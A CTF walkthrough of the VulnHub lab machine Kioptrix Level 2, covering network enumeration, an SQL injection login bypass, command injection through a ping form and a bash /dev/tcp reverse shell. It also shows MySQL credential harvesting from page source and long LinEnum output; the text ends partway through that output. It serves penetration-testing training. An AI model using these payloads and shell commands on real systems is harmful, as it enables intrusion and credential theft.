---
title: "Kioptrix 2: Boot-to-Root"
date: 2024-05-31 17:17 +0300
categories: [VulnHub, Easy-VulnHub]
tags: [CTF, Walkthrough, SQLI, Command Injection, Kernel Exploit]
author: sensei0x01
image: "/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/banner.png"
---

## Description

Kioptrix Level 2 is a continuation of the Kioptrix series, designed to further hone the skills of aspiring penetration testers. This virtual machine presents more advanced challenges than its predecessor, requiring users to delve deeper into enumeration and exploitation techniques. It introduces more complex vulnerabilities, including those related to outdated software and misconfigured services. Users will need to leverage their knowledge of tools like Nmap, Nikto, and Metasploit, as well as manual exploitation skills, to gain root access. Kioptrix Level 2 helps bridge the gap between beginner and intermediate-level penetration testing, making it an excellent learning tool for those progressing in the field of ethical hacking.

|**Box**|Kioptrix Level 2|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Kioptrix](https://www.vulnhub.com/author/kioptrix,8/) |

---

## 🖥️Lab Setup

- VMware workstation
- Kali Linux VM
- [Kioptrix Level 2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) VM

---

## ⬇️Installation

Download the **".rar"** file from the VulnHub page mentioned above and extract its contents. You will find the following files:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic1.png)

Modify line 46 of the **"CentOs4.5.vmx"** file from `ethernet0.networkName = "Bridged"` to `ethernet0.networkName = "NAT"`.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic2.png)

Open the **"CensOs4.5.vmx"** file, also known as the virtual machine configuration file, via VMWare Workstation to import the VM.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic3.png)

Browse to the file location and import it.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic4.png)

Now that the machine is imported, power it on.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic5.png)

---

## 🔍Host Discovery

After installing the VM, we need to determine which IP address has been assigned to it. Many tools can accomplish this. In this article, we’ll be using the `nmap` host discovery feature.

```shell
 sudo nmap -sn 192.168.109.0/24 --exclude 192.168.109.131
```

**"192.168.109.0/24"** is the subnet address of the NAT virtual network in my VMware Workstation. It might be different on your device. You can exclude hosts or entire networks with the `--exclude` option. **"192.168.109.131"** is the IP address of the Kali VM.

When the scan is complete, you will see a result like this on your terminal:

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 04:06 EDT
Nmap scan report for 192.168.109.1
Host is up (0.00017s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.109.2
Host is up (0.00010s latency).
MAC Address: 00:50:56:FF:68:65 (VMware)
Nmap scan report for 192.168.109.146
Host is up (0.00014s latency).
MAC Address: 00:0C:29:53:19:4C (VMware)
Nmap scan report for 192.168.109.254
Host is up (0.00026s latency).
MAC Address: 00:50:56:F4:20:16 (VMware)
Nmap done: 255 IP addresses (4 hosts up) scanned in 2.05 seconds
```

From the result above, the target IP address is **"192.168.109.146"**. The other active hosts are the VMware default gateway, DNS server, and DHCP server.

---

## 🕵🏼Enumeration

After identifying the target, the next step is to scan for open ports and the services running on each of them to understand our attack surface. Nmap is an excellent tool for host discovery, port scanning, service detection, and more.

```shell
target=192.168.109.146
sudo nmap -sS -T4 -p- -sVC -O $target -oN scan-result.txt
```

Let’s break this command down:
- `sudo`: to run it with root privileges so that we can modify the TCP default connection (Three-way handshake) to make our scan faster.
- `-sS` : for [stealthy scan](https://nmap.org/book/synscan.html)
- `-T4` : for aggressive [timing templates](https://nmap.org/book/performance-timing-templates.html)
- `-p-` : for scanning all ports
- `-sV` : for [service detection](https://nmap.org/book/vscan.html)
- `-sC` : to use [default NSE scripts](https://nmap.org/book/nse-usage.html#nse-categories)
- `-O` : [OS detection](https://nmap.org/book/man-os-detection.html)
- `-oN` : save the scan results in **"scan-result.txt"**

Here is the result of the `nmap` scan:

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 04:28 EDT
Nmap scan report for 192.168.109.146
Host is up (0.00079s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            619/udp   status
|_  100024  1            622/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_ssl-date: 2024-05-25T05:19:20+00:00; -3h09m34s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_http-server-header: Apache/2.0.52 (CentOS)
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
622/tcp  open  status   1 (RPC #100024)
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:53:19:4C (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: -3h09m34s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.49 seconds
```

There are a total of 7 open ports.

First, let's check if rpcbind has something to do with. We can do this using `rpcinfo`.

```shell
rpcinfo -p $target
```

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic6.png)

There don't seem to be any useful services to exploit here. Let’s move on to checking the website running on ports **80** and **443**.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic7.png)

The website might not be compatible with the **TLS 1.2** protocol, which is the minimum version supported by Firefox. It appears that the website is using an older version of TLS. We should consider updating the minimum supported version in Firefox. Here's how you can do it:
1. In the Firefox address bar, type `about:config` and press **Enter**.
2. In the Search field, enter `tls`.
3. Find the entry for `security.tls.version.min` and **double-click** on it.
4. Set the integer value to `1` to force the protocol to **TLS 1**.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic8.png)

After making this adjustment, revisit the website; it should now open without issues.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic9.png)

Ports **80** and **443** are both routing visitors to the same login page.

---

## 👨🏻‍💻Exploitation

When dealing with login pages, the first attempt typically involves trying default credentials such as:

- admin: admin
- admin: password
- administrator: password

However, none of these worked. Shall we consider attempting SQL injection (SQLi) to bypass authentication?

Let's assume the SQL statement used to check credentials is:

```sql
SELECT * FROM admin_table WHERE username='user1' AND password='password1'
```

If the SQL statement is passed to the database without sanitization, we can potentially bypass authentication. To achieve this, we enter a logical expression that is always true, such as `1=1`.

For example, if we set `username=' or 1=1--`, the single quote escapes the existing single quote in the SQL statement, and -- comments out the rest of the statement. This modifies the query to something like:

```sql
select * from admin_table where username='' or 1=1 -- and password='password1'
```
>Don’t forget to add a whitespace after `--` because according to the MySQL documentation, MySQL requires at least one whitespace character after the double dash for it to be registered as a comment.
{: .prompt-info }

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic10.png)

After injecting this SQL statement into the username field, it should bypass the authentication and redirect you to this page:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic11.png)

As depicted in the screenshot above, this page functions as a web console with a single input field requesting an IP address for pinging. I'll test it with the loopback IP **"127.0.0.1"**.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic12.png)

Let's assume the input parameter name is 'ip' and it is passed to the backend PHP code. The structure would look like this:

```php
<?php
$ip = $_POST['ip'];
$cmd = 'ping '. $ip
system($cmd);
?>
```

If we terminate the input line with `;` and append another system command like `id`, the input would look something like this: `127.0.0.1; id`.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic13.png)

Great! We have a web shell now. Let's set up a reverse shell to simplify interacting with it. There are multiple methods to accomplish this, and checking the availability of `nc` ('netcat') is essential. We can verify its existence using the command `whatis nc`:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic14.png)

Unfortunately, `nc` (netcat) isn't installed on the target machine. Let's attempt to establish a reverse shell using `bash` and `/dev/tcp/`:

```shell
bash -i >& /dev/tcp/192.168.109.131/7702 0>&1
```

Let's break it down
- `bash`: Invokes the Bash shell.
- `-i`: Makes the Bash shell interactive, enabling interactive input and output.
- `>&`: Redirects both standard output (stdout) and standard error (stderr).
- `/dev/tcp/192.168.109.131/7702`: Specifies the location where output is redirected. `/dev/tcp` is a Unix-like system path that grants access to TCP sockets as if they were files. Here, it indicates the IP address `192.168.109.131` and port `7702`, typically belonging to the attacker who is listening.
- `0>&1`: Redirects file descriptor `0` (stdin) to file descriptor `1` (stdout), effectively treating stdin as identical to stdout.

Before executing this command on the target machine, a netcat listener must be established on the Kali machine. To do this, I'll use the command:

```shell
nc -lnvp 7702
```

Next, run the following command on the target machine: `bash -i >& /dev/tcp/192.168.109.131/7702 0>&1`. This will establish a connection with the `nc` listener on your Kali machine.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic15.png)

Here we go! Now, we need to escalate our privileges. First, I'll check the webpage source code and configuration files for credentials. There are two PHP files to examine.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic16.png)

The source code of index.php is as follows:

```php
<<?php
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        //print "Connected to MySQL<br />";
        mysql_select_db("webapp");

        if ($_POST['uname'] != ""){
            $username = $_POST['uname'];
            $password = $_POST['psw'];
            $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
            //print $query."<br>";
            $result = mysql_query($query);

            $row = mysql_fetch_array($result);
            //print "ID: ".$row['id']."<br />";
        }

?>
<html>
<body>
<?php
if ($row['id']==""){
?>
```

As shown in the previous code, we have obtained the MySQL credentials:
- Username: john
- Password: hiroshima

Next, we need to upgrade our shell to an interactive shell to connect to the database.

Step 1: Run this command:

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

Step 2: Send the shell process to the background:

```
press ctrl + z
```

Step 3: Send special characters to the target machine and bring the shell process to the foreground:

```shell
stty raw -echo; fg
```

Step 4: Assign values to the TERM and SHELL environment variables:

```shell
export TERM=xterm
export SHELL=bash
```

After obtaining an interactive shell, use the following command to connect to the MySQL database `mysql -u john -p`:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic17.png)

List the databases to see if there is anything useful to check `SHOW DATABASES;`:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic18.png)

There are three databases. Let's explore them to see if they contain any useful data.

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic19.png)

To display the contents of the user table, use the following command `SELECT User,Password FROM user;`:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic20.png)

As shown in the previous screenshot, we have two users, **"root"** and **"john"**. Both users share the same hashed password. Since we already know John's password from the webpage source code (**"hiroshima"**), there's no need to crack the hash.

Now, let's log in with the root user:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic21.png)

I considered using [User Defined Functions](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf) to elevate our privileges, so I searched for variables containing the word **"plugin"**, such as `plugin_dir`:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic22.png)

I couldn't find anything related, so it seems MySQL was a dead end. I also tried to log in via **SSH** with these credentials, but it didn't work.

Let's enumerate the system using **"LinEnum.sh"**. I already have it on my Kali machine, and I'll retrieve it on the target shell using `wget`:

![Desktop View](/assets/img/posts/2024-05-31-kioptrix-2-boot-to-root/pic23.png)

Next, we need to add execute permissions to the file in order to run it.

```shell
chmod +x LinEnum.sh
```

After running this script, it will enumerate the system and display the following information:

```shell
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sat May 25 03:32:14 EDT 2024

### SYSTEM ##############################################
[-] Kernel information:
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux


[-] Kernel information (continued):
Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007


[-] Specific release information:
CentOS release 4.5 (Final)


[-] Hostname:
kioptrix.level2


### USER/GROUP ##########################################
[-] Current user/group info:
uid=48(apache) gid=48(apache) groups=48(apache)


[-] Who else is logged on:
 03:32:14 up  2:50,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
uid=1(bin) gid=1(bin) groups=1(bin),2(daemon),3(sys)
uid=2(daemon) gid=2(daemon) groups=2(daemon),1(bin),4(adm),7(lp)
uid=3(adm) gid=4(adm) groups=4(adm),3(sys)
uid=4(lp) gid=7(lp) groups=7(lp)
uid=5(sync) gid=0(root) groups=0(root)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=7(halt) gid=0(root) groups=0(root)
uid=8(mail) gid=12(mail) groups=12(mail)
uid=9(news) gid=13(news) groups=13(news)
uid=10(uucp) gid=14(uucp) groups=14(uucp)
uid=11(operator) gid=0(root) groups=0(root)
uid=12(games) gid=100(users) groups=100(users)
uid=13(gopher) gid=30(gopher) groups=30(gopher)
uid=14(ftp) gid=50(ftp) groups=50(ftp)
uid=99(nobody) gid=99(nobody) groups=99(nobody)
uid=81(dbus) gid=81(dbus) groups=81(dbus)
uid=69(vcsa) gid=69(vcsa) groups=69(vcsa)
uid=37(rpm) gid=37(rpm) groups=37(rpm)
uid=68(haldaemon) gid=68(haldaemon) groups=68(haldaemon)
uid=34(netdump) gid=34(netdump) groups=34(netdump)
uid=28(nscd) gid=28(nscd) groups=28(nscd)
uid=74(sshd) gid=74(sshd) groups=74(sshd)
uid=32(rpc) gid=32(rpc) groups=32(rpc)
uid=47(mailnull) gid=47(mailnull) groups=47(mailnull)
uid=51(smmsp) gid=51(smmsp) groups=51(smmsp)
uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)
uid=65534(nfsnobody) gid=65534(nfsnobody) groups=65534(nfsnobody)
uid=77(pcap) gid=77(pcap) groups=77(pcap)
uid=48(apache) gid=48(apache) groups=48(apache)
uid=23(squid) gid=23(squid) groups=23(squid)
uid=67(webalizer) gid=67(webalizer) groups=67(webalizer)
uid=43(xfs) gid=43(xfs) groups=43(xfs)
uid=38(ntp) gid=38(ntp) groups=38(ntp)
uid=66(pegasus) gid=65(pegasus) groups=65(pegasus)
uid=27(mysql) gid=27(mysql) groups=27(mysql)
uid=500(john) gid=500(john) groups=500(john)
uid=501(harold) gid=501(harold) groups=501(harold)


[-] It looks like we have some admin users:
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
uid=2(daemon) gid=2(daemon) groups=2(daemon),1(bin),4(adm),7(lp)
uid=3(adm) gid=4(adm) groups=4(adm),3(sys)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 24K
drwxr-xr-x   4 root   root   4.0K Oct 12  2009 .
drwxr-xr-x  23 root   root   4.0K May 25 00:41 ..
drwx------   2 harold harold 4.0K Oct 12  2009 harold
drwx------   2 john   john   4.0K Oct  8  2009 john


### ENVIRONMENTAL #######################################
[-] Environment information:
CONSOLE=/dev/console
SELINUX_INIT=YES
TERM=linux
INIT_VERSION=sysvinit-2.85
PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin
runlevel=3
RUNLEVEL=3
PWD=/tmp
LANG=en_US.UTF-8
previous=N
PREVLEVEL=N
SHLVL=5
HOME=/
_=/bin/env


[-] SELinux seems to be present:
SELinux status:         disabled


[-] Path information:
/sbin:/usr/sbin:/bin:/usr/bin:/usr/X11R6/bin
drwxr-xr-x  2 root root  4096 May 25 01:47 /bin
drwxr-xr-x  2 root root 12288 Oct  7  2009 /sbin
drwxr-xr-x  2 root root 36864 May 25 01:47 /usr/bin
drwxr-xr-x  2 root root 12288 May 25 01:47 /usr/sbin
drwxr-xr-x  2 root root  4096 Oct  7  2009 /usr/X11R6/bin


[-] Available shells:
/bin/sh
/bin/bash
/sbin/nologin
/bin/ash
/bin/bsh
/bin/ksh
/usr/bin/ksh
/usr/bin/pdksh
/bin/tcsh
/bin/csh
/bin/zsh


[-] Current umask value:
u=rwx,g=rx,o=rx
0022


[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r--  1 root root    0 Oct  7  2009 /etc/cron.deny
-rw-r--r--  1 root root  255 Feb 21  2005 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root  4096 Jul 12  2006 .
drwxr-xr-x  80 root root 12288 May 25 01:47 ..

/etc/cron.daily:
total 108
drwxr-xr-x   2 root root  4096 Oct  7  2009 .
drwxr-xr-x  80 root root 12288 May 25 01:47 ..
lrwxrwxrwx   1 root root    28 Oct  7  2009 00-logwatch -> ../log.d/scripts/logwatch.pl
-rwxr-xr-x   1 root root   418 Sep 14  2006 00-makewhatis.cron
-rwxr-xr-x   1 root root   135 Feb 21  2005 00webalizer
-rwxr-xr-x   1 root root   276 Feb 21  2005 0anacron
-rw-r--r--   1 root root   797 Feb 21  2005 certwatch
-rwxr-xr-x   1 root root   180 Oct 20  2006 logrotate
-rwxr-xr-x   1 root root  2133 Dec  1  2004 prelink
-rwxr-xr-x   1 root root   104 May  4  2007 rpm
-rwxr-xr-x   1 root root   121 Aug 21  2005 slocate.cron
-rwxr-xr-x   1 root root   286 Feb 21  2005 tmpwatch
-rwxr-xr-x   1 root root   158 May  5  2007 yum.cron

/etc/cron.hourly:
total 24
drwxr-xr-x   2 root root  4096 Feb 21  2005 .
drwxr-xr-x  80 root root 12288 May 25 01:47 ..

/etc/cron.monthly:
total 32
drwxr-xr-x   2 root root  4096 Oct  7  2009 .
drwxr-xr-x  80 root root 12288 May 25 01:47 ..
-rwxr-xr-x   1 root root   278 Feb 21  2005 0anacron

/etc/cron.weekly:
total 48
drwxr-xr-x   2 root root  4096 Oct  7  2009 .
drwxr-xr-x  80 root root 12288 May 25 01:47 ..
-rwxr-xr-x   1 root root   414 Sep 14  2006 00-makewhatis.cron
-rwxr-xr-x   1 root root   277 Feb 21  2005 0anacron
-rwxr-xr-x   1 root root    90 May  5  2007 yum.cron


[-] Crontab contents:
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

# run-parts
01 * * * * root run-parts /etc/cron.hourly
02 4 * * * root run-parts /etc/cron.daily
22 4 * * 0 root run-parts /etc/cron.weekly
42 4 1 * * root run-parts /etc/cron.monthly


[-] Anacron jobs and associated file permissions:
-rw-r--r--  1 root root 329 Feb 21  2005 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

1       65      cron.daily              run-parts /etc/cron.daily
7       70      cron.weekly             run-parts /etc/cron.weekly
30      75      cron.monthly            run-parts /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 28
drwxr-xr-x   2 root root 4096 Oct  7  2009 .
drwxr-xr-x  14 root root 4096 Oct  7  2009 ..
-rw-------   1 root root    9 May 25 01:47 cron.daily
-rw-------   1 root root    9 May 25 01:57 cron.monthly
-rw-------   1 root root    9 May 25 01:52 cron.weekly


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 00:0C:29:53:19:4C  
          inet addr:192.168.109.146  Bcast:192.168.109.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe53:194c/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:69986 errors:0 dropped:0 overruns:0 frame:0
          TX packets:66921 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:4434088 (4.2 MiB)  TX bytes:3824872 (3.6 MiB)
          Interrupt:177 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:40 errors:0 dropped:0 overruns:0 frame:0
          TX packets:40 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3206 (3.1 KiB)  TX bytes:3206 (3.1 KiB)

sit0      Link encap:IPv6-in-IPv4  
          NOARP  MTU:1480  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)


[-] ARP history:
? (192.168.109.131) at 00:0C:29:31:66:3E [ether] on eth0
? (192.168.109.254) at 00:50:56:F4:20:16 [ether] on eth0
? (192.168.109.254) at 00:50:56:F4:20:16 [ether] on eth0


[-] Nameserver(s):
nameserver 192.168.109.2


[-] Default route:
default         192.168.109.2   0.0.0.0         UG    0      0        0 eth0


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:622                 0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN      -                   
tcp        0      0 0.0.0.0:631                 0.0.0.0:*                   LISTEN      -                   
tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      -                   
tcp        0      0 :::80                       :::*                        LISTEN      9877/sh             
tcp        0      0 :::22                       :::*                        LISTEN      -                   
tcp        0      0 :::443                      :::*                        LISTEN      9877/sh             


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
udp        0      0 0.0.0.0:68                  0.0.0.0:*                               -                   
udp        0      0 0.0.0.0:616                 0.0.0.0:*                               -                   
udp        0      0 0.0.0.0:619                 0.0.0.0:*                               -                   
udp        0      0 0.0.0.0:111                 0.0.0.0:*                               -                   
udp        0      0 0.0.0.0:631                 0.0.0.0:*                               -                   


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4  3484  548 ?        S    00:41   0:01 init [3]                                   
root         2  0.0  0.0     0    0 ?        SN   00:41   0:00 [ksoftirqd/0]
root         3  0.0  0.0     0    0 ?        S<   00:41   0:00 [events/0]
root         4  0.0  0.0     0    0 ?        S<   00:41   0:00 [khelper]
root         5  0.0  0.0     0    0 ?        S<   00:41   0:00 [kacpid]
root        82  0.0  0.0     0    0 ?        S<   00:41   0:00 [kblockd/0]
root        83  0.0  0.0     0    0 ?        S    00:41   0:00 [khubd]
root       100  0.0  0.0     0    0 ?        S    00:41   0:00 [pdflush]
root       101  0.0  0.0     0    0 ?        S    00:41   0:00 [pdflush]
root       102  0.0  0.0     0    0 ?        S    00:41   0:00 [kswapd0]
root       103  0.0  0.0     0    0 ?        S<   00:41   0:00 [aio/0]
root       249  0.0  0.0     0    0 ?        S    00:41   0:00 [kseriod]
root       482  0.0  0.0     0    0 ?        S<   00:41   0:00 [ata/0]
root       483  0.0  0.0     0    0 ?        S<   00:41   0:00 [ata_aux]
root       498  0.0  0.0     0    0 ?        S    00:41   0:00 [kjournald]
root      1703  0.0  0.3  3340  436 ?        S<s  00:41   0:00 udevd
root      1741  0.0  0.0     0    0 ?        S    00:41   0:00 [shpchpd_event]
root      1820  0.0  0.0     0    0 ?        S<   00:41   0:00 [kauditd]
root      1931  0.0  0.0     0    0 ?        S    00:41   0:00 [kjournald]
root      2398  0.0  0.4  2284  540 ?        Ss   00:42   0:00 syslogd -m 0
root      2402  0.0  0.3  1964  388 ?        Ss   00:42   0:00 klogd -x
rpc       2541  0.0  0.4  2168  596 ?        Ss   00:42   0:00 portmap
rpcuser   2560  0.0  0.6  3232  824 ?        Ss   00:42   0:00 rpc.statd
root      2586  0.0  0.2  5216  368 ?        Ss   00:42   0:00 rpc.idmapd
root      2658  0.0  0.3  1956  440 ?        Ss   00:42   0:00 /usr/sbin/acpid
root      2719  0.0  0.9  4944 1140 ?        Ss   00:42   0:00 /usr/sbin/sshd
root      2755  0.0  0.6  2752  768 ?        Ss   00:42   0:00 xinetd -stayalive -pidfile /var/run/xinetd.pid
root      2773  0.0  1.4  9124 1860 ?        Ss   00:42   0:00 sendmail: accepting connections
smmsp     2783  0.0  1.2  7432 1636 ?        Ss   00:42   0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue
root      2794  0.0  0.2  2372  352 ?        Ss   00:42   0:00 gpm -m /dev/input/mice -t imps2
root      2803  0.0  0.7  4740  940 ?        Ss   00:42   0:00 crond
xfs       2824  0.0  1.0  4000 1296 ?        Ss   00:42   0:00 xfs -droppriv -daemon
root      2841  0.0  0.3  2704  428 ?        Ss   00:42   0:00 /usr/sbin/atd
dbus      2850  0.0  0.6  3052  800 ?        Ss   00:42   0:00 dbus-daemon-1 --system
root      2859  0.0  4.5  9132 5760 ?        Ss   00:42   0:00 hald
root      3115  0.0  0.5  2228  680 ?        Ss   00:42   0:00 dhclient
root      3117  0.0  8.1 22180 10268 ?       Ss   00:42   0:00 httpd
root      3143  0.0  0.9  4988 1236 ?        S    00:42   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --err-log=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid
